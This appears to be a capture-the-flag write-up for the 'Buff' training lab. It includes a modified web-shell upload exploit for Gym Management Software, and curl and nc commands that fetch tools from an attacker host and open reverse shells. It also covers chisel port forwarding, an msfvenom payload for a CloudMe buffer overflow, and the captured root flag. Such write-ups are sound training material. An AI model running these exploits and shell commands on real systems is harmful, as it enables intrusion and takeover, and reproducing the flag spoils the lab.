## Buff 

### Lab Details 

- Difficulty: Easy
- Type: Web App, Web Exploit, Buffer Overflow, Priv Esc, Windows

#### Tasks
Q1: On which TCP port is Buff hosting a website?
- `nmap -sT -T4 -vv -A -p- -oA Buff 10.10.10.198`
- port 8080 is running HTTP from outputs of the nmap file
```
<snip>
8080/tcp open  http       syn-ack Apache httpd 2.4.43 ((Win64) OpenSSL/1.1.1g PHP/7.4.6)
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.43 (Win64) OpenSSL/1.1.1g PHP/7.4.6
|_http-title: mrb3n's Bro Hut
| http-open-proxy: Potentially OPEN proxy.
|_Methods supported:CONNECTION
<snip>
```


Q2: Which framework is the website using? (Three words, no version)
- framework info can be found on http://10.10.10.198:8080/contact.php
- use curl to confirm `curl http://10.10.10.198:8080/contact.php` 
```
<snip>
<li>
<b><i>mrb3n's Bro Hut</i></b>
<li>
Made using Gym Management Software 1.0
</ul>
<snip>
```

Q3: Which user is the website running as?
- there are multiple POCs available which allows us to gain a webshell to the target however the ones ive tried does not provide a stable connection or perform the functions as expected.
- e.g. https://github.com/Zeop-CyberSec/gym_mgmt_system_unauth_rce/blob/master/gym_mgmt_system_unauth_rce.rb
- AND e.g. https://www.exploit-db.com/exploits/48506
- resolution: introduce a simple web shell
- went back and editted 48506.py to enable a simpler webshell, per below
```
import requests, sys, urllib, re
from colorama import Fore, Back, Style
requests.packages.urllib3.disable_warnings(requests.packages.urllib3.exceptions.InsecureRequestWarning)

def webshell(SERVER_URL, session):
    try:
        WEB_SHELL = SERVER_URL+'upload/kamehameha.php'
        getdir  = {'telepathy': 'echo %CD%'}
        r2 = session.get(WEB_SHELL, params=getdir, verify=False)
        status = r2.status_code
        if status != 200:
            print Style.BRIGHT+Fore.RED+"[!] "+Fore.RESET+"Could not connect to the webshell."+Style.RESET_ALL
            r2.raise_for_status()
        print(Fore.GREEN+'[+] '+Fore.RESET+'Successfully connected to webshell.')
        cwd = re.findall('[CDEF].*', r2.text)
        cwd = cwd[0]+"> "
        term = Style.BRIGHT+Fore.GREEN+cwd+Fore.RESET
        while True:
            thought = raw_input(term)
            command = {'telepathy': thought}
            r2 = requests.get(WEB_SHELL, params=command, verify=False)
            status = r2.status_code
            if status != 200:
                r2.raise_for_status()
            response2 = r2.text
            print(response2)
    except:
        print("\r\nExiting.")
        sys.exit(-1)

def formatHelp(STRING):
    return Style.BRIGHT+Fore.RED+STRING+Fore.RESET

def header():
    BL   = Style.BRIGHT+Fore.GREEN
    RS   = Style.RESET_ALL
    FR   = Fore.RESET
    SIG  = BL+'            /\\\n'+RS
    SIG += Fore.YELLOW+'/vvvvvvvvvvvv '+BL+'\\'+FR+'--------------------------------------,\n'
    SIG += Fore.YELLOW+'`^^^^^^^^^^^^'+BL+' /'+FR+'============'+Fore.RED+'BOKU'+FR+'====================="\n'
    SIG += BL+'            \/'+RS+'\n'
    return SIG

if __name__ == "__main__":
    print header();
    if len(sys.argv) != 2:
        print formatHelp("(+) Usage:\t python %s <WEBAPP_URL>" % sys.argv[0])
        print formatHelp("(+) Example:\t python %s 'https://10.0.0.3:443/gym/'" % sys.argv[0])
        sys.exit(-1)
    SERVER_URL = sys.argv[1]
    UPLOAD_DIR = 'upload.php?id=kamehameha'
    UPLOAD_URL = SERVER_URL + UPLOAD_DIR
    s = requests.Session()
    s.get(SERVER_URL, verify=False)
    PNG_magicBytes = '\x89\x50\x4e\x47\x0d\x0a\x1a'
    png     = {
                'file':
                  (
                    'kaio-ken.php.png',
                    PNG_magicBytes+'\n'+'<?php echo shell_exec($_GET["cmd"]); ?>',
                    'image/png',
                    {'Content-Disposition': 'form-data'}
                  )
              }
    fdata   = {'pupload': 'upload'}
    r1 = s.post(url=UPLOAD_URL, files=png, data=fdata, verify=False)
   # webshell(SERVER_URL, s)
```
- commented out the execution of webshell function and modified the png dictionary to  `cmd`
- to run commands use below
`http://10.10.10.198:8080/upload/kamehameha.php?cmd=whoami`
- can use this to fetch tools and execute reverse shell
`http://10.10.10.198:8080/upload/kamehameha.php?cmd=curl%20-O%20http://10.10.14.27:8000/nc64.exe`
`http://10.10.10.198:8080/upload/kamehameha.php?cmd=nc64.exe%2010.10.14.27%204444%20-e%20cmd` -> generates an interactive shell
```
C:\xampp\htdocs\gym\upload>whoami
whoami
buff\shaun
```
Q5: What is the name of an interesting binary inside the shaun user's home directory?
- `dir C:\Users\shaun\Downloads` -> CloudMe_112.exe

Q6: Which localhost port is the above binary listening on?
- `netstat -ano | findstr LISTENING`
```
C:\xampp\htdocs\gym\upload>netstat -ano | findstr LISTENING
netstat -ano | findstr LISTENING
<snip>
  TCP    127.0.0.1:8888         0.0.0.0:0              LISTENING       4552
<snip>
```
Q7: What version of CloudMe has a buffer overflow vulnerability?
- use searchsploit to find POC for its vulnerability
```
$: searchsploit cloudme 11                
--------------------------------------------------------------- ---------------------------------
 Exploit Title                                                 |  Path
--------------------------------------------------------------- ---------------------------------
CloudMe 1.11.2 - Buffer Overflow (PoC)                         | windows/remote/48389.py
```

Q8: Submit the flag located on the administrator's desktop.
- since the application is listening internally we will need to forward the portto our attack host so we can access the remote port locally
- to do that will need tools like chisel or ligolo-ng
- chisel is easier for port fowarding on a single target
- setup to gain root as below
```
#1. set up python3 -m http.server to server tools 
 - we need nc64.exe for reverse shell and chisel.exe for port forwarding
http://10.10.10.198:8080/upload/kamehameha.php?cmd=curl%20-O%20http://10.10.14.27:8000/chisel.exe
http://10.10.10.198:8080/upload/kamehameha.php?cmd=curl%20-O%20http://10.10.14.27:8000/nc64.exe
`http://10.10.10.198:8080/upload/kamehameha.php?cmd=nc64.exe%2010.10.14.27%204444%20-e%20cmd`

#2. set up chisel
# On attacker, using port 9050 on target to receive the connection from remote
./chisel server --reverse --port 9050

# On target, running chisel as client connecting to attacker at port 9050
# fowarding port 8888
C:\xampp\htdocs\gym\upload>chisel.exe client 10.10.14.27:9050 R:8888:127.0.0.1:8888

#3. since CloudMe has a buffer overflow vulnerability we need to create a payload to inject along with buffer
# using msfvenom to generate the payload
$: msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=10.10.14.27 LPORT=9999 -f python -b "\x00\x0d\x0a" EXITFUNC=thread --smallest

#4. update POC , replace the existing buf with the msfvenom generate payload

#5. set up listener and run the POC
# listener on attacker 
$: rlwrap nc -lvnp 9999
listening on [any] 9999 ...
connect to [10.10.14.27] from (UNKNOWN) [10.10.10.198] 49683
Microsoft Windows [Version 10.0.17134.1610]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>type C:\Users\Administrator\Desktop\root.txt

type C:\Users\Administrator\Desktop\root.txt
ba8420b682467266b8283f5a4f34036f

# running the POC, note the POC might take sometime before giving the shell
$: python2 PoC_exploit_Win10_x64.py
 [+] Payload with 2000 bytes sent!
```

#### Lesson Learned
- web shell workings
- buffer overflow practice

